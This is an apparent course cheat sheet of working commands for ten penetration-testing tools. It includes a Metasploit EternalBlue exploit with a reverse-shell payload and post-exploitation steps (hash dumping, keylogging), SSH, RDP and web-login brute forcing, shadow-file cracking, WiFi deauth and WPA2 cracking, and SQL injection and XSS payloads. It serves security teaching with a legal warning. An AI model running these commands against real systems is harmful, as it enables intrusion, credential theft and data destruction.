
╔══════════════════════════════════════════════════╗
║     T O O L S   G U I D E  —  A R S E N A L      ║
╚══════════════════════════════════════════════════╝

> NMAP · WIRESHARK · 
> JOHN · AIRCRACK · 

---

## `$ cat arsenal_intro.txt`

Theory without practice is useless. This guide gives you real, working
command examples for every major cybersecurity tool. Learn the flags.
Understand the output. Build the muscle memory.

> ⚠️  LEGAL WARNING: Only use these tools on systems you own or have
>     explicit written permission to test. Unauthorized scanning/exploitation
>     is illegal in most jurisdictions.

---

```
╔══════════════════════════════════════════════════╗
║   01  N M A P  —  Network Scanner               ║
╚══════════════════════════════════════════════════╝
```

## `🔍 Nmap — Network Mapper`

**Install:** `sudo apt install nmap`

```bash
# ── BASIC SCANS ──────────────────────────────────────────
nmap 192.168.1.1                     # Default scan (top 1000 ports)
nmap 192.168.1.0/24                  # Scan entire subnet
nmap -iL targets.txt                 # Scan list of targets from file
nmap scanme.nmap.org                 # Official test target

# ── PORT SPECIFICATION ───────────────────────────────────
nmap -p 22,80,443 192.168.1.1        # Scan specific ports
nmap -p 1-65535 192.168.1.1          # Scan ALL ports
nmap -p- 192.168.1.1                 # Shorthand for all ports
nmap --top-ports 100 192.168.1.1     # Top 100 most common ports

# ── SCAN TYPES ───────────────────────────────────────────
nmap -sS 192.168.1.1                 # SYN scan (stealth, default with root)
nmap -sT 192.168.1.1                 # TCP connect scan (no root needed)
nmap -sU 192.168.1.1                 # UDP scan
nmap -sn 192.168.1.0/24             # Ping sweep — host discovery only

# ── SERVICE & OS DETECTION ───────────────────────────────
nmap -sV 192.168.1.1                 # Service version detection
nmap -O 192.168.1.1                  # OS detection (requires root)
nmap -A 192.168.1.1                  # Aggressive: OS + version + scripts + traceroute

# ── NSE SCRIPTS ──────────────────────────────────────────
nmap -sC 192.168.1.1                 # Run default scripts
nmap --script vuln 192.168.1.1       # Run vulnerability detection scripts
nmap --script http-title 192.168.1.1 # Grab HTTP page titles
nmap --script ssh-brute 192.168.1.1  # Brute force SSH (use in labs only)

# ── OUTPUT ────────────────────────────────────────────────
nmap -oN scan.txt 192.168.1.1        # Save output in normal format
nmap -oX scan.xml 192.168.1.1        # Save output in XML
nmap -oG scan.gnmap 192.168.1.1      # Grepable format

# ── COMMON PENTEST COMBO ──────────────────────────────────
nmap -sV -sC -p- -T4 -oN output.txt 192.168.1.1
# -sV: versions | -sC: default scripts | -p-: all ports | -T4: fast timing
```

---

```
╔══════════════════════════════════════════════════╗
║   02  W I R E S H A R K  —  Packet Analyzer     ║
╚══════════════════════════════════════════════════╝
```

## `🦈 Wireshark — Deep Packet Analysis`

**Install:** `sudo apt install wireshark`

```bash
# ── COMMAND LINE (tshark) ────────────────────────────────
tshark -i eth0                       # Capture on eth0
tshark -i eth0 -w capture.pcap       # Save capture to file
tshark -r capture.pcap               # Read a saved capture
tshark -i eth0 -f "port 80"          # Capture filter — HTTP only
tshark -r file.pcap -Y "http"        # Display filter — show HTTP packets
tshark -r file.pcap -T fields -e http.host  # Extract HTTP hostnames

# ── WIRESHARK DISPLAY FILTERS (GUI) ──────────────────────
http                                 # Show all HTTP traffic
http.request.method == "POST"        # Only POST requests
ip.addr == 192.168.1.10             # Traffic to/from specific IP
ip.src == 192.168.1.10              # Traffic FROM specific IP
tcp.port == 443                      # HTTPS traffic
dns                                  # All DNS traffic
tcp.flags.syn == 1                   # SYN packets (connection attempts)
!(arp or dns or icmp)                # Exclude noise

# ── USEFUL FOLLOW STREAMS ────────────────────────────────
# Right-click a packet → Follow → TCP Stream
# This reconstructs full conversations (very useful for CTFs)

# ── EXPORT CREDENTIALS (HTTP Basic Auth) ─────────────────
# Filter: http.authorization
# Look for Base64 encoded strings — decode with:
echo "dXNlcjpwYXNz" | base64 -d      # Reveals user:pass
```

---

```
╔══════════════════════════════════════════════════╗
║   03  B U R P  S U I T E  —  Web Proxy          ║
╚══════════════════════════════════════════════════╝
```

## `🕷️ Burp Suite — Web Application Testing`

**Install:** Download from portswigger.net (Community Edition is free)

```bash
# ── SETUP ────────────────────────────────────────────────
# 1. Launch Burp → Proxy tab → Intercept is ON
# 2. Set browser proxy: 127.0.0.1:8080
# 3. Install Burp CA cert in browser (for HTTPS interception)
#    → Navigate to http://burpsuite → Download certificate

# ── PROXY — INTERCEPT & MODIFY ───────────────────────────
# Forward: sends request as-is
# Drop: blocks the request
# Action → Send to Repeater: resend and modify manually

# ── REPEATER ─────────────────────────────────────────────
# Send request → Modify parameters → Resend → Compare responses
# Great for: manual SQL injection, parameter tampering, auth bypass

# ── INTRUDER — AUTOMATED ATTACKS ─────────────────────────
# Attack Types:
# Sniper      → One payload position, one list
# Battering   → One position, all combos from one list
# Cluster     → Multiple positions simultaneously
# Pitchfork   → Multiple positions, multiple lists (username:password)

# ── SCANNER (Pro only) / ACTIVE SCAN ─────────────────────
# Community: use passive scanning only
# Right-click request → Scan / Passive Crawl

# ── COMMON USE CASES ─────────────────────────────────────
# SQL Injection test:
#   Original: id=1
#   Payloads: id=1' | id=1 OR 1=1-- | id=1; DROP TABLE users--

# XSS test:
#   Payload: <script>alert(1)</script>
#   Payload: "><img src=x onerror=alert(1)>

# Auth bypass:
#   Modify: admin=false → admin=true
#   Modify: role=user → role=admin
```

---

```
╔══════════════════════════════════════════════════╗
║   04  M E T A S P L O I T  —  Framework         ║
╚══════════════════════════════════════════════════╝
```

## `💀 Metasploit Framework`

**Install:** Pre-installed on Kali. Others: `sudo apt install metasploit-framework`

```bash
# ── START ────────────────────────────────────────────────
msfconsole                           # Launch Metasploit

# ── SEARCH & SELECT ──────────────────────────────────────
search eternalblue                   # Search for exploits by name/CVE
search type:exploit platform:windows # Filter by type and platform
use exploit/windows/smb/ms17_010_eternalblue  # Select an exploit
info                                 # Show full info about selected module

# ── CONFIGURE ────────────────────────────────────────────
show options                         # List required options
set RHOSTS 192.168.1.10             # Set target IP
set RPORT 445                        # Set target port
set LHOST 192.168.1.5               # Set your listener IP
set LPORT 4444                       # Set listener port
set PAYLOAD windows/x64/meterpreter/reverse_tcp  # Set payload

# ── RUN ──────────────────────────────────────────────────
check                                # Check if target is vulnerable
run                                  # Execute the exploit
exploit                              # Same as run

# ── METERPRETER COMMANDS (post-exploitation) ─────────────
sysinfo                              # System information
getuid                               # Current user
getsystem                            # Attempt privilege escalation
hashdump                             # Dump password hashes
ps                                   # List running processes
migrate <PID>                        # Migrate to another process
shell                                # Drop to system shell
upload /path/local /path/remote      # Upload file
download /path/remote /path/local    # Download file
keyscan_start                        # Start keylogger
screenshot                           # Take screenshot

# ── AUXILIARY MODULES ────────────────────────────────────
use auxiliary/scanner/portscan/tcp   # TCP port scanner
use auxiliary/scanner/smb/smb_version  # SMB version detection
use auxiliary/scanner/http/http_version  # HTTP banner grabbing
```

---

```
╔══════════════════════════════════════════════════╗
║   05  H Y D R A  —  Password Cracker            ║
╚══════════════════════════════════════════════════╝
```

## `🔑 Hydra — Brute Force Tool`

**Install:** `sudo apt install hydra`

```bash
# ── SSH BRUTE FORCE ──────────────────────────────────────
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
hydra -L users.txt -P passwords.txt ssh://192.168.1.10
hydra -l root -P rockyou.txt -t 4 ssh://192.168.1.10    # 4 threads

# ── FTP ──────────────────────────────────────────────────
hydra -l admin -P rockyou.txt ftp://192.168.1.10

# ── HTTP FORM LOGIN ──────────────────────────────────────
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# ── HTTP BASIC AUTH ──────────────────────────────────────
hydra -l admin -P rockyou.txt http-get://192.168.1.10/admin

# ── RDP (Windows Remote Desktop) ─────────────────────────
hydra -l administrator -P rockyou.txt rdp://192.168.1.10

# ── KEY FLAGS ────────────────────────────────────────────
# -l     Single username
# -L     Username list file
# -p     Single password
# -P     Password list file
# -t     Number of parallel threads (default 16)
# -V     Verbose — show each attempt
# -f     Stop after first valid credential found
# -o     Save results to file
```

---

```
╔══════════════════════════════════════════════════╗
║   06  J O H N  —  Password Recovery             ║
╚══════════════════════════════════════════════════╝
```

## `🔓 John the Ripper`

**Install:** `sudo apt install john`

```bash
# ── BASIC CRACKING ───────────────────────────────────────
john hashes.txt                      # Auto-detect format and crack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# ── FORMAT SPECIFIC ──────────────────────────────────────
john --format=md5 hashes.txt         # MD5 hashes
john --format=sha256 hashes.txt      # SHA-256
john --format=bcrypt hashes.txt      # bcrypt
john --format=NT hashes.txt          # Windows NTLM hashes

# ── LINUX SHADOW FILE ────────────────────────────────────
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt                    # Crack Linux passwords

# ── ZIP / RAR PASSWORD ───────────────────────────────────
zip2john protected.zip > zip.hash    # Extract hash from zip
john zip.hash --wordlist=rockyou.txt

rar2john protected.rar > rar.hash
john rar.hash --wordlist=rockyou.txt

# ── SHOW CRACKED PASSWORDS ───────────────────────────────
john --show hashes.txt               # Display cracked results

# ── RULES (MANGLING) ─────────────────────────────────────
john --wordlist=rockyou.txt --rules hashes.txt  # Apply mutation rules
```

---

```
╔══════════════════════════════════════════════════╗
║   07  H A S H C A T  —  GPU Cracker             ║
╚══════════════════════════════════════════════════╝
```

## `⚡ Hashcat — GPU-Powered Cracking`

**Install:** `sudo apt install hashcat`

```bash
# ── IDENTIFY HASH TYPE ────────────────────────────────────
hashcat --example-hashes | grep -i md5  # Find hash mode number
# OR use: hash-identifier / haiti tool

# ── ATTACK MODES ─────────────────────────────────────────
# -a 0  → Dictionary attack
# -a 1  → Combination attack
# -a 3  → Brute force / mask attack
# -a 6  → Hybrid (wordlist + mask)

# ── COMMON HASH MODES (-m) ───────────────────────────────
# 0     MD5
# 100   SHA1
# 1400  SHA-256
# 1800  sha512crypt (Linux $6$)
# 1000  NTLM (Windows)
# 3200  bcrypt
# 22000 WPA2 (WiFi)

# ── DICTIONARY ATTACK ────────────────────────────────────
hashcat -m 0 -a 0 hash.txt rockyou.txt       # MD5 + wordlist
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt    # Windows NTLM

# ── BRUTE FORCE WITH MASK ────────────────────────────────
hashcat -m 0 -a 3 hash.txt ?d?d?d?d          # 4-digit PIN
hashcat -m 0 -a 3 hash.txt ?u?l?l?l?d?d?d?d  # Upper+lower+digits
# Masks: ?l=lowercase ?u=uppercase ?d=digit ?s=special ?a=all

# ── RULES ────────────────────────────────────────────────
hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# ── SHOW RESULTS ─────────────────────────────────────────
hashcat -m 0 hash.txt --show                 # Display cracked hashes
```

---

```
╔══════════════════════════════════════════════════╗
║   08  A I R C R A C K - N G  —  WiFi Security   ║
╚══════════════════════════════════════════════════╝
```

## `📶 Aircrack-ng — Wireless Testing`

**Install:** `sudo apt install aircrack-ng`

```bash
# ── SETUP MONITOR MODE ───────────────────────────────────
iwconfig                             # List wireless interfaces
sudo airmon-ng start wlan0           # Enable monitor mode → wlan0mon
sudo airmon-ng check kill            # Kill interfering processes

# ── SCAN FOR NETWORKS ────────────────────────────────────
sudo airodump-ng wlan0mon            # Show all nearby APs

# ── CAPTURE HANDSHAKE ────────────────────────────────────
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# -c 6: channel | --bssid: target AP MAC | -w: output file prefix

# ── DEAUTH ATTACK (forces handshake) ─────────────────────
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# -0 10: send 10 deauth packets | -a: target AP MAC

# ── CRACK WPA2 HANDSHAKE ─────────────────────────────────
aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# ── WPA2 WITH HASHCAT (faster) ───────────────────────────
hcxdumptool -i wlan0mon -o capture.pcapng --enable-status=1
hcxpcapngtool -o hash.hc22000 capture.pcapng
hashcat -m 22000 hash.hc22000 rockyou.txt

# ── STOP MONITOR MODE ────────────────────────────────────
sudo airmon-ng stop wlan0mon
```

---

```
╔══════════════════════════════════════════════════╗
║   09  N I K T O  —  Web Scanner                 ║
╚══════════════════════════════════════════════════╝
```

## `🕸️ Nikto — Web Vulnerability Scanner`

**Install:** `sudo apt install nikto`

```bash
# ── BASIC SCAN ───────────────────────────────────────────
nikto -h http://192.168.1.10         # Scan HTTP target
nikto -h https://192.168.1.10        # Scan HTTPS target
nikto -h 192.168.1.10 -port 8080     # Scan non-default port

# ── OUTPUT ───────────────────────────────────────────────
nikto -h 192.168.1.10 -o report.txt         # Save as text
nikto -h 192.168.1.10 -o report.html -Format htm  # HTML report

# ── OPTIONS ──────────────────────────────────────────────
nikto -h 192.168.1.10 -Tuning 1          # XSS tests only
nikto -h 192.168.1.10 -Tuning 4          # Injection tests only
nikto -h 192.168.1.10 -ssl               # Force SSL
nikto -h 192.168.1.10 -useproxy http://127.0.0.1:8080  # Through Burp

# What Nikto checks:
# → Outdated software versions
# → Dangerous HTTP methods (PUT, DELETE)
# → Default credentials
# → Common vulnerable files (/admin, /backup, /config)
# → Missing security headers
```

---

```
╔══════════════════════════════════════════════════╗
║   10  G O B U S T E R  —  Directory Fuzzer      ║
╚══════════════════════════════════════════════════╝
```

## `📂 Gobuster — Directory & Subdomain Enumeration`

**Install:** `sudo apt install gobuster`

```bash
# ── DIRECTORY BRUTE FORCE ────────────────────────────────
gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://192.168.1.10 -w /usr/share/seclists/Discovery/Web-Content/big.txt

# ── WITH FILE EXTENSIONS ─────────────────────────────────
gobuster dir -u http://192.168.1.10 -w common.txt -x php,html,txt,bak

# ── SUBDOMAIN ENUMERATION ────────────────────────────────
gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# ── VHOST DISCOVERY ──────────────────────────────────────
gobuster vhost -u http://example.com -w subdomains.txt

# ── KEY FLAGS ────────────────────────────────────────────
# -u    Target URL
# -w    Wordlist path
# -x    File extensions to append
# -t    Threads (default 10, increase to 50 for speed)
# -o    Output file
# -k    Skip TLS verification
# -s    Only show specific status codes: -s 200,301,302
# -b    Blacklist status codes: -b 404,403

# ── USEFUL WORDLISTS (install SecLists) ──────────────────
# sudo apt install seclists
# /usr/share/seclists/Discovery/Web-Content/common.txt
# /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
# /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

---

```
╔══════════════════════════════════════════════════╗
║        TOOL CHEATSHEET SUMMARY                   ║
╚══════════════════════════════════════════════════╝
```

```
┌─────────────────┬───────────────────────────────────────────────┐
│ Tool            │ Primary Use                                   │
├─────────────────┼───────────────────────────────────────────────┤
│ nmap            │ Network/port scanning, service detection       │
│ wireshark       │ Packet capture and traffic analysis            │
│ burpsuite       │ Web app testing, intercept/modify requests     │
│ metasploit      │ Exploitation framework, post-exploitation      │
│ hydra           │ Online password brute forcing                  │
│ john            │ Offline password hash cracking (CPU)          │
│ hashcat         │ Offline hash cracking (GPU-accelerated)       │
│ aircrack-ng     │ WiFi security testing, WPA2 cracking           │
│ nikto           │ Web server vulnerability scanning             │
│ gobuster        │ Directory and subdomain enumeration            │
└─────────────────┴───────────────────────────────────────────────┘
```

---

```
> "A tool is only as good as the person wielding it."
> "Understand what each command does — never blindly copy."
```

---

*Part of the [Linux_Cybersec_Course](https://github.com/Ayushburman/Linux_Cybersec_Course)*
